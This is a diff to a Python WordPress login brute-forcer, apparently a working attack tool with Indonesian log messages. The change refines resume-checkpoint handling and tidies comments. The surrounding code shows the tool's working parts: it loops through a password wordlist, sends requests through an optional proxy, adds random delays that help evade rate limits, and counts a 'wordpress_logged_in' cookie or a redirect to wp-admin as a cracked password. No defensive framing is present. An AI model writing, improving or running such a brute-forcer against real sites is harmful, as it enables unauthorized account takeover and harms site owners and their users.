@@ -159,18 +159,24 @@ def bruteforce_wp(
     proxies = {"http": proxy, "https": proxy} if proxy else None
 
     total = len(passwords)
-    # Resume support
+
+    # Resume support (with reset if out of bounds)
     start_idx = 0
     if resume_file and resume_file.exists():
-        start_idx = int(resume_file.read_text().strip() or "0")
-        logging.info("Melanjutkan dari password ke-%d", start_idx)
+        val = int(resume_file.read_text().strip() or "0")
+        if val >= total:
+            # checkpoint sudah melebihi jumlah passwords: reset
+            resume_file.unlink()
+            logging.info("Resume-file melebihi wordlist, reset ke 0")
+        else:
+            start_idx = val
+            logging.info("Melanjutkan dari password ke-%d", start_idx)
 
     for idx in range(start_idx, total):
         pwd = passwords[idx]
-        # tampilkan progress di satu baris
+        # progress
         print(f"\r{YELLOW}[{idx+1}/{total}]{RESET} Mencoba password: {pwd}", end="", flush=True)
 
-        # jeda acak
         time.sleep(random.uniform(delay_range[0], delay_range[1]))
 
         data = {
@@ -195,11 +201,9 @@ def bruteforce_wp(
             logging.warning(" Request gagal: %s", e)
             continue
 
-        # Cek berhasil login
         cookies = session.cookies.get_dict()
         if "wordpress_logged_in" in cookies or "/wp-admin/" in resp.url:
-            # pindah ke baris baru untuk pesan sukses
-            print()
+            print()  # newline setelah progress
             logging.info(f"{GREEN}🎉 Password ditemukan: {username} / {pwd}{RESET}")
             if resume_file and resume_file.exists():
                 resume_file.unlink()
@@ -209,8 +213,10 @@ def bruteforce_wp(
         if resume_file:
             resume_file.write_text(str(idx + 1))
 
-    # jika tidak ada yang cocok
-    print()  # pastikan kursor pindah baris
+    # selesai tanpa hasil: hapus checkpoint agar run berikutnya mulai dari 0
+    print()
+    if resume_file and resume_file.exists():
+        resume_file.unlink()
     logging.error("%s Tidak ada password cocok untuk %s.%s", RED, username, RESET)
     return None
 
